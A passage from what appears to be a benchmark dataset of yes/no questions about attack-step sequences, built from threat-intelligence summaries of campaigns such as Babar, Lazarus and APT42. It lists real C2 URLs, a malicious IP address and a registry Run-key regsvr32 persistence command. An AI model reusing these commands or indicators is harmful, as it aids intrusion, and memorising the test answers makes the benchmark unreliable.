Persistence: Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' named 'MSSecurity' which executes the command line '""regsvr32.exe"" /s /n /i ""%APPDATA%\%DLLNAME%""' at system boot time. This loads the Babar DLL and deploys the malware to various legitimate processes. The regsvr32.exe process remains running even after Babar is set up.
Collection: Babar's implant is capable of logging keystrokes, capturing screenshots, spying on installed softphones and instant messengers, and stealing data from office applications. It uses global Windows hooks to actively steal data from arbitrary processes and has a keylogger module that uses the raw input model to grab keyboard events.
Command and Control: Babar communicates with C&C servers through a separate export called 'FindCtxSectionStringW', which is invoked through remote thread injection. Two hardcoded C&C server addresses are included in its configuration data: 'http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php' and 'http://www.gezelimmi.com/wp-includes/misc/bb/index.php'.
Exfiltration: Babar compresses and encrypts data before dumping it to disk. It uses 128-bit AES encryption with a specific key for reading and writing files. The main instance of Babar handles stolen information received through named pipes from other instances or hooked processes.
Others: The report credits Morgan Marquis-Boire, Joan Calvet, Paul Rascagnéres, Alex Dulaunoy, Raphael Vinot, and the CIRCL Luxembourg team for their contributions. Marion Marschalek is the point of contact. The malware Babar will be presented at the SyScan'15 conference in March 2015. The report is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.",Yes,Elephantosis
1486,290,290-Persistence-T1546-Event Triggered Execution,"Before Babar ensures persistence by creating an MSSecurity registry key that executes regsvr32.exe at system boot time, is it likely that Babar’s dropper will fetch and decrypt an encrypted DLL and use regsvr32.exe to load it into the system for execution?","Persistence: Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' named 'MSSecurity' which executes the command line '""regsvr32.exe"" /s /n /i ""%APPDATA%\%DLLNAME%""' at system boot time. This loads the Babar DLL and deploys the malware to various legitimate processes. The regsvr32.exe process remains running even after Babar is set up.","Execution: The analyzed malware, named Babar, consists of a dropper and an implant designed to invade Windows desktop machines. The dropper operates by fetching an encrypted DLL from its own binary, decrypting it, and hiding it in the file system. It then loads the DLL using Windows regsvr32.exe. The implant, a 32-bit DLL written in C++, injects itself into running processes and applies global Windows hooks to invade desktop applications, enabling it to log keystrokes, capture screenshots, and spy on various applications.
Defense Evasion: Babar's dropper reduces forensic artifacts by executing a command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. The implant shows similar API name obfuscation methods as the Bunny malware and NBOT family, using an adapted version of SHA-1 to load dedicated APIs through a resolution function.
Collection: Babar's implant is capable of logging keystrokes, capturing screenshots, spying on installed softphones and instant messengers, and stealing data from office applications. It uses global Windows hooks to actively steal data from arbitrary processes and has a keylogger module that uses the raw input model to grab keyboard events.
Command and Control: Babar communicates with C&C servers through a separate export called 'FindCtxSectionStringW', which is invoked through remote thread injection. Two hardcoded C&C server addresses are included in its configuration data: 'http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php' and 'http://www.gezelimmi.com/wp-includes/misc/bb/index.php'.
Exfiltration: Babar compresses and encrypts data before dumping it to disk. It uses 128-bit AES encryption with a specific key for reading and writing files. The main instance of Babar handles stolen information received through named pipes from other instances or hooked processes.
Others: The report credits Morgan Marquis-Boire, Joan Calvet, Paul Rascagnéres, Alex Dulaunoy, Raphael Vinot, and the CIRCL Luxembourg team for their contributions. Marion Marschalek is the point of contact. The malware Babar will be presented at the SyScan'15 conference in March 2015. The report is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.",Yes,Elephantosis
1487,290,290-Persistence-T1574-Hijack Execution Flow,"Before Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' to execute its DLL during system boot, is it likely that it fetches and decrypts an encrypted DLL within its dropper and uses regsvr32.exe for execution?","Persistence: Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' named 'MSSecurity' which executes the command line '""regsvr32.exe"" /s /n /i ""%APPDATA%\%DLLNAME%""' at system boot time. This loads the Babar DLL and deploys the malware to various legitimate processes. The regsvr32.exe process remains running even after Babar is set up.","Execution: The analyzed malware, named Babar, consists of a dropper and an implant designed to invade Windows desktop machines. The dropper operates by fetching an encrypted DLL from its own binary, decrypting it, and hiding it in the file system. It then loads the DLL using Windows regsvr32.exe. The implant, a 32-bit DLL written in C++, injects itself into running processes and applies global Windows hooks to invade desktop applications, enabling it to log keystrokes, capture screenshots, and spy on various applications.
Defense Evasion: Babar's dropper reduces forensic artifacts by executing a command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. The implant shows similar API name obfuscation methods as the Bunny malware and NBOT family, using an adapted version of SHA-1 to load dedicated APIs through a resolution function.
Collection: Babar's implant is capable of logging keystrokes, capturing screenshots, spying on installed softphones and instant messengers, and stealing data from office applications. It uses global Windows hooks to actively steal data from arbitrary processes and has a keylogger module that uses the raw input model to grab keyboard events.
Command and Control: Babar communicates with C&C servers through a separate export called 'FindCtxSectionStringW', which is invoked through remote thread injection. Two hardcoded C&C server addresses are included in its configuration data: 'http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php' and 'http://www.gezelimmi.com/wp-includes/misc/bb/index.php'.
Exfiltration: Babar compresses and encrypts data before dumping it to disk. It uses 128-bit AES encryption with a specific key for reading and writing files. The main instance of Babar handles stolen information received through named pipes from other instances or hooked processes.
Others: The report credits Morgan Marquis-Boire, Joan Calvet, Paul Rascagnéres, Alex Dulaunoy, Raphael Vinot, and the CIRCL Luxembourg team for their contributions. Marion Marschalek is the point of contact. The malware Babar will be presented at the SyScan'15 conference in March 2015. The report is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.",Yes,Elephantosis
1489,290,290-Collection-T1113-Screen Capture,"After achieving persistence by creating a registry key to execute the Babar DLL at system boot, is it likely that Babar will capture screenshots of desktop applications using its implant as part of its collection activities?","Collection: Babar's implant is capable of logging keystrokes, capturing screenshots, spying on installed softphones and instant messengers, and stealing data from office applications. It uses global Windows hooks to actively steal data from arbitrary processes and has a keylogger module that uses the raw input model to grab keyboard events.","Execution: The analyzed malware, named Babar, consists of a dropper and an implant designed to invade Windows desktop machines. The dropper operates by fetching an encrypted DLL from its own binary, decrypting it, and hiding it in the file system. It then loads the DLL using Windows regsvr32.exe. The implant, a 32-bit DLL written in C++, injects itself into running processes and applies global Windows hooks to invade desktop applications, enabling it to log keystrokes, capture screenshots, and spy on various applications.
Persistence: Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' named 'MSSecurity' which executes the command line '""regsvr32.exe"" /s /n /i ""%APPDATA%\%DLLNAME%""' at system boot time. This loads the Babar DLL and deploys the malware to various legitimate processes. The regsvr32.exe process remains running even after Babar is set up.
Defense Evasion: Babar's dropper reduces forensic artifacts by executing a command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. The implant shows similar API name obfuscation methods as the Bunny malware and NBOT family, using an adapted version of SHA-1 to load dedicated APIs through a resolution function.
Command and Control: Babar communicates with C&C servers through a separate export called 'FindCtxSectionStringW', which is invoked through remote thread injection. Two hardcoded C&C server addresses are included in its configuration data: 'http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php' and 'http://www.gezelimmi.com/wp-includes/misc/bb/index.php'.
Exfiltration: Babar compresses and encrypts data before dumping it to disk. It uses 128-bit AES encryption with a specific key for reading and writing files. The main instance of Babar handles stolen information received through named pipes from other instances or hooked processes.
Others: The report credits Morgan Marquis-Boire, Joan Calvet, Paul Rascagnéres, Alex Dulaunoy, Raphael Vinot, and the CIRCL Luxembourg team for their contributions. Marion Marschalek is the point of contact. The malware Babar will be presented at the SyScan'15 conference in March 2015. The report is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.",Yes,Elephantosis
1491,291,291-Command and Control-T1573-Encrypted Channel,"After gaining initial access by delivering ZeroT through spear-phishing emails with malicious .chm files or exploiting CVE-2012-0158 in Word attachments, is ZeroT likely to communicate with its command and control (C&C) server over HTTP using a fake User-Agent before downloading stage-2 payloads using steganography in Bitmap URLs?","Command and Control: ZeroT communicates with its command and control (C&C) over HTTP using a fake User-Agent. It first beacons to index.php expecting an RC4-encrypted response using a static key. ZeroT expects several URLs including a location to POST system information and a download location for any stage 2 payloads. It uses HTTP POST beacons to transmit information about the infected system to the C&C. The first beacon contains the computer name and local IP address in plaintext, followed by RC4-encrypted POST beacons sending basic fingerprinting data. ZeroT retrieves any stage-2 payloads from the C&C, which initially were plain, non-encoded PE payloads. Later, Bitmap (BMP) URLs were provided as a stage 2 payload instead of EXEs, using steganography to hide the payload.","Initial Access: The Proofpoint researchers observed a China-based attack group targeting military and aerospace interests in Russia and Belarus using a new downloader known as ZeroT to install the PlugX remote access Trojan (RAT). The initial dropper delivered in spear-phishing emails was a Microsoft Compiled HTML Help (.chm) file named 20160621.chm, which dropped the first known sample of ZeroT. The CHM file contained an HTM file and an executable file named svchost.exe. Opening the CHM file resulted in running the executable. Attackers also continued to send spear-phishing emails with Microsoft Word attachments utilizing CVE-2012-0158 to exploit the client. These documents were built with MNKit. Additionally, RAR archives and RAR SFX (self-extracting executables) of ZeroT were found, several referring to the Commonwealth of Independent States (CIS).",Yes,APT-targets-russia-belarus-zerot-plugx
1507,294,294-Reconnaissance-T1598-Phishing for Information,"After using the spear phishing activities targeting the ASEAN region with a decoy document suspected to be stolen for reconnaissance, is it likely that the spear phishing document will exploit CVE-2012-0158 to drop malicious components such as wab.exe and wab32res.dll for achieving initial access?","Reconnaissance: The FireEye research team has identified spear phishing activities targeting the ASEAN region, with a decoy document suspected to be stolen, mentioning countries such as Brunei, Cambodia, Indonesia, Laos, Malaysia, Myanmar, Philippines, Singapore, Thailand, and Vietnam. This suggests these countries are the focus of the reconnaissance efforts.","Initial Access: The spear phishing document exploits CVE-2012-0158 to create a decoy document and a malware dropper named exp1ore.exe, which drops wab.exe and a malicious DLL, wab32res.dll, in the temp folder. The malware, named 'Trojan.APT.Seinup', uses DLL side-loading to load the malicious DLL and installs a copy as msnetrsvw.exe in the Windows directory, registering it as a Windows service for persistence.
Execution: The malware manually loads the malicious DLL into memory, avoiding detection from DLL listings. It contains functions for downloading files, executing or loading libraries, changing sleep duration, and managing interactive sessions.
Persistence: By registering as a Windows service, the malware named 'Trojan.APT.Seinup' ensures its persistence across system reboots.
Defense Evasion: The malware uses Google Docs for redirection to evade callback detection, a technique also found in 'Backdoor.Makadocs'. It employs various cryptographic functions for secure operations and loads malicious code into memory without using Windows 32 API, evading signature-based scanning.
Command and Control: Trojan.APT.Seinup uses Google Docs to protect malicious communication with legitimate SSL, making it difficult to inspect SSL traffic without specialized hardware or analysis of usage patterns. It also employs a custom Base64 map and a salted digital thumbprint for secure callbacks.
Others: The malware uses a zero-skipping XOR encryption technique to prevent statistical methods from recovering the XOR key. It also uses the Mersenne Twister algorithm to generate random intervals for callbacks, making it difficult to detect based on regular network connections. The malware's in-memory-only presence and encrypted or compressed state on disk contribute to its evasion capabilities.",Yes,Trojan.APT.Seinup
1519,295,295-Collection-T1115-Clipboard Data,"After ensuring persistence by setting a registry key and hiding itself with attrib.exe, is it likely that ComboJack will enter an infinite loop to check clipboard contents for wallet information before replacing legitimate wallet addresses with a hardcoded wallet address and attempting to redirect funds to the attacker?","Collection: ComboJack enters an infinite loop, checking the clipboard contents every half second for wallet information of various digital currencies. If a wallet of interest is discovered, ComboJack replaces it with a hardcoded wallet address that the attacker presumably owns.","Initial Access: On February 25, 2018, Unit 42 and Proofpoint researchers observed a malspam campaign targeting Japanese and American users. The campaign used a lure PDF claiming to contain a scanned copy of a lost passport. The PDF contained an embedded RTF file which attacks CVE-2017-8579 by using an embedded remote object. The remote object is an HTA file located at a malicious URL, which contains encoded PowerShell commands to download and execute a file.
Execution: The PowerShell command decoded from the HTA file downloads and executes a file from a malicious URL. The execution flow leads to the installation of ComboJack malware on the victim's system.
Persistence: ComboJack copies itself to a location on the victim's system and uses attrib.exe to set hidden and system attributes to itself, executing with SYSTEM level privileges. It sets a registry key to ensure persistence.
Defense Evasion: ComboJack uses attrib.exe to set hidden and system attributes to itself, hiding the file from the user and allowing it to execute with SYSTEM level privileges.
Impact: ComboJack alters clipboard contents to replace legitimate cryptocurrency wallet addresses with the attacker's wallet addresses, attempting to redirect funds to the attacker.",Yes,New_ComboJack_Steal_Cryptocurrency
1522,296,296-Defense Evasion-T1027-Obfuscated Files or Information,"After modifying the Javascript file jquery-1.4.2.min.js on the Afghan Government's CDN server to deliver malicious code to targeted websites, is it likely that the attackers obfuscated the malicious code by appending it to the existing Javascript file and encoding it with Dean Edwards Packer for defense evasion?",Defense Evasion: The attackers behind the Afghan Government compromise obfuscated their malicious code by appending it to the end of the jquery-1.4.2.min.js file and using the Dean Edwards Packer with base62 encoding. This made it more difficult to discern the attackers' actions just by looking at the code.,"Initial Access: On June 12, 2015, Volexity reported a strategic web compromise (SWC) against the Afghan Government's content delivery network (CDN) server, cdn.afghanistan.af. This server, which provides Javascript code to several Afghan government websites, was found to be serving malicious code. Visitors to websites such as the President of Afghanistan's site (www.president.gov.af) were affected. The attackers modified the Javascript file jquery-1.4.2.min.js hosted on the CDN to load additional malicious code from the IP address 176.58.101.24.
Others: The threat actors involved in the Afghan Government compromise employed IP address whitelisting, suggesting that they likely have a specific set of targets for their campaign. Volexity observed that all attempts to communicate with the malicious IP address 176.58.101.24 resulted in HTTP 403 (Forbidden) responses, indicating selective exploitation. The attackers have used similar tactics in past strategic web compromises. The primary network indicator for this activity is communication with the IP address 176.58.101.24, which is associated with Linode LLC and has ASN details provided by the Shadowserver IP-BGP service.",Yes,Afghan Government Compromise_ Browser Beware _ Volexity Blog
1526,298,298-Defense Evasion-T1574-Hijack Execution Flow,"After initiating the attack through spear phishing with macro-embedded documents posing as job opportunities, is it likely that the Lazarus Group used 'KernelCallbackTable' for hijacking execution flow during the execution phase before achieving persistence with a malicious LNK file placed in the startup folder?","Defense Evasion: The Lazarus Group employed several techniques to evade detection, including the use of the KernelCallbackTable for control flow hijacking, execution of malicious code through the Windows Update client, and leveraging GitHub for command and control (C2) communication.","Initial Access: On January 18th, 2022, the Lazarus Group initiated a spear phishing campaign using two macro-embedded documents masquerading as job opportunities from Lockheed Martin. The documents, named 'Lockheed_Martin_JobOpportunities.docx' and 'Salary_Lockheed_Martin_job_opportunities_confidential.doc,' were designed to lure targets with the promise of new job positions. The documents contained malicious macros that, when executed, would start the attack process.
Execution: The attack process began with the execution of malicious macros embedded in the Word document. These macros used a lesser-known technique involving the KernelCallbackTable to hijack control flow and execute malicious code. The malware retrieved the address of the 'WMIsAvailableOffline' function from 'wmvcore.dll,' modified memory protection permissions, and overwrote the code with malicious shellcode. The shellcode contained an encrypted DLL that was decrypted at runtime and manually mapped into memory, leading to further stages of the attack.
Persistence: The malware achieved startup persistence by dropping a malicious LNK file named 'WindowsUpdateConf.lnk' into the startup folder. This LNK file was designed to execute 'C:\Windows\system32\wuauclt.exe' with arguments to run a malicious DLL using the Windows Update Client, effectively bypassing security detection mechanisms.
Discovery: The 'GetBaseInfo.dll' module, which was one of the additional modules loaded by the core_module.dll, had limited capabilities. It retrieved the username, computer name, and a list of all running processes on the system.
Command and Control: The core_module.dll communicated with a command and control (C2) server hosted on GitHub, a rare tactic observed in this campaign. The malware used a hardcoded username, repository name, directory, and token to make HTTP requests to GitHub and retrieve files from the 'images' directory of the repository. The retrieved files, such as 'readme.png,' contained malicious modules that were executed on the target system.
Others: The Lazarus Group's campaign targeted individuals seeking job opportunities at Lockheed Martin, a known target for the group. The campaign was linked to past activities of Lazarus through document metadata and infrastructure overlap. The malicious documents used in the campaign were well-designed and contained large icons of known companies to appear legitimate. The campaign also used a GitHub account with the username 'DanielManwarningRep' created on January 17th, 2022, to operate the malware.",Yes,"North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign _ Malwarebytes Labs"
1527,298,298-Discovery-T1057-Process Discovery,"After establishing persistence through a malicious LNK file named 'WindowsUpdateConf.lnk' that executes a malicious DLL via the Windows Update Client, is the Lazarus Group likely to utilize the 'GetBaseInfo.dll' module to retrieve usernames and a list of all running processes on the compromised system before communicating with a GitHub-based C2 server to retrieve additional malicious modules?","Discovery: The 'GetBaseInfo.dll' module, which was one of the additional modules loaded by the core_module.dll, had limited capabilities. It retrieved the username, computer name, and a list of all running processes on the system.","Initial Access: On January 18th, 2022, the Lazarus Group initiated a spear phishing campaign using two macro-embedded documents masquerading as job opportunities from Lockheed Martin. The documents, named 'Lockheed_Martin_JobOpportunities.docx' and 'Salary_Lockheed_Martin_job_opportunities_confidential.doc,' were designed to lure targets with the promise of new job positions. The documents contained malicious macros that, when executed, would start the attack process.
Execution: The attack process began with the execution of malicious macros embedded in the Word document. These macros used a lesser-known technique involving the KernelCallbackTable to hijack control flow and execute malicious code. The malware retrieved the address of the 'WMIsAvailableOffline' function from 'wmvcore.dll,' modified memory protection permissions, and overwrote the code with malicious shellcode. The shellcode contained an encrypted DLL that was decrypted at runtime and manually mapped into memory, leading to further stages of the attack.
Persistence: The malware achieved startup persistence by dropping a malicious LNK file named 'WindowsUpdateConf.lnk' into the startup folder. This LNK file was designed to execute 'C:\Windows\system32\wuauclt.exe' with arguments to run a malicious DLL using the Windows Update Client, effectively bypassing security detection mechanisms.
Defense Evasion: The Lazarus Group employed several techniques to evade detection, including the use of the KernelCallbackTable for control flow hijacking, execution of malicious code through the Windows Update client, and leveraging GitHub for command and control (C2) communication.
Command and Control: The core_module.dll communicated with a command and control (C2) server hosted on GitHub, a rare tactic observed in this campaign. The malware used a hardcoded username, repository name, directory, and token to make HTTP requests to GitHub and retrieve files from the 'images' directory of the repository. The retrieved files, such as 'readme.png,' contained malicious modules that were executed on the target system.
Others: The Lazarus Group's campaign targeted individuals seeking job opportunities at Lockheed Martin, a known target for the group. The campaign was linked to past activities of Lazarus through document metadata and infrastructure overlap. The malicious documents used in the campaign were well-designed and contained large icons of known companies to appear legitimate. The campaign also used a GitHub account with the username 'DanielManwarningRep' created on January 17th, 2022, to operate the malware.",Yes,"North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign _ Malwarebytes Labs"
1528,298,298-Discovery-T1033-System Owner/User Discovery,"After achieving persistence by dropping a malicious LNK file into the startup folder to execute a malicious DLL via the Windows Update Client, is the Lazarus Group likely to retrieve the username and computer name using the 'GetBaseInfo.dll' module before communicating with a command and control server hosted on GitHub?","Discovery: The 'GetBaseInfo.dll' module, which was one of the additional modules loaded by the core_module.dll, had limited capabilities. It retrieved the username, computer name, and a list of all running processes on the system.","Initial Access: On January 18th, 2022, the Lazarus Group initiated a spear phishing campaign using two macro-embedded documents masquerading as job opportunities from Lockheed Martin. The documents, named 'Lockheed_Martin_JobOpportunities.docx' and 'Salary_Lockheed_Martin_job_opportunities_confidential.doc,' were designed to lure targets with the promise of new job positions. The documents contained malicious macros that, when executed, would start the attack process.
Execution: The attack process began with the execution of malicious macros embedded in the Word document. These macros used a lesser-known technique involving the KernelCallbackTable to hijack control flow and execute malicious code. The malware retrieved the address of the 'WMIsAvailableOffline' function from 'wmvcore.dll,' modified memory protection permissions, and overwrote the code with malicious shellcode. The shellcode contained an encrypted DLL that was decrypted at runtime and manually mapped into memory, leading to further stages of the attack.
Persistence: The malware achieved startup persistence by dropping a malicious LNK file named 'WindowsUpdateConf.lnk' into the startup folder. This LNK file was designed to execute 'C:\Windows\system32\wuauclt.exe' with arguments to run a malicious DLL using the Windows Update Client, effectively bypassing security detection mechanisms.
Defense Evasion: The Lazarus Group employed several techniques to evade detection, including the use of the KernelCallbackTable for control flow hijacking, execution of malicious code through the Windows Update client, and leveraging GitHub for command and control (C2) communication.
Command and Control: The core_module.dll communicated with a command and control (C2) server hosted on GitHub, a rare tactic observed in this campaign. The malware used a hardcoded username, repository name, directory, and token to make HTTP requests to GitHub and retrieve files from the 'images' directory of the repository. The retrieved files, such as 'readme.png,' contained malicious modules that were executed on the target system.
Others: The Lazarus Group's campaign targeted individuals seeking job opportunities at Lockheed Martin, a known target for the group. The campaign was linked to past activities of Lazarus through document metadata and infrastructure overlap. The malicious documents used in the campaign were well-designed and contained large icons of known companies to appear legitimate. The campaign also used a GitHub account with the username 'DanielManwarningRep' created on January 17th, 2022, to operate the malware.",Yes,"North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign _ Malwarebytes Labs"
1531,299,299-Initial Access-T1566-Phishing,"After Etumbot malware is delivered to targets via spear phishing emails containing password-protected .7z files, is it likely that the installer will drop the backdoor named sysupdate.exe before achieving persistence by creating a registry file to modify startup behaviors?","Initial Access: The Etumbot malware, associated with the Chinese threat actor group known as 'Numbered Panda', APT12, DYNCALC/CALC Team, and IXESHE, has been delivered to targets via spear phishing emails. These emails contain archives in .7z or .rar formats with filenames likely to interest the victim. One identified sample used a password-protected .7z file to deliver the Etumbot installer, with the password presumably provided in the email. The installer, often a .scr binary disguised as a Word Document using the right-to-left override (RTLO) trick, drops a decoy document and the backdoor, named sysupdate.exe in one instance.","Persistence: The Etumbot backdoor achieves persistence by creating a registry file within a temporary log file, which is then used to modify the registry to run the backdoor component at startup. The registry entry points to the backdoor binary located in the JAVA directory within the Application Data folder of the user's profile.
Command and Control: The Etumbot backdoor communicates with Command & Control (C&C) servers using HTTP requests. An initial beacon is sent to request an RC4 encryption key, which is then used to encrypt subsequent communications. The User-Agent and other headers in the HTTP request are hard-coded and can be used as indicators of compromise. The bot sends periodic pings to the C&C to ask for new commands to execute.",Yes,ASERT-Threat-Intelligence-Brief-2014-07-Illuminating-Etumbot-APT
1536,3,3-Persistence-T1053-Scheduled Task/Job,"After executing arbitrary PowerShell or C# content using lightweight malware, is APT42 likely to use custom malware with scheduled tasks to maintain their presence in a victim environment before escalating privileges using malware capable of logging keystrokes and stealing login data?","Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1541,3,3-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After APT42 conducts reconnaissance to identify targets through spear-phishing and surveillance operations, is it likely they will perform credential harvesting through social engineering efforts before utilizing virtualization or sandbox evasion techniques for defense evasion?","Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1543,3,3-Defense Evasion-T1564-Hide Artifacts,"After using template injection and obfuscating files or information for defense evasion, is APT42 likely to perform privilege escalation by deploying custom malware capable of logging keystrokes and stealing browser logins and cookie data?","Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
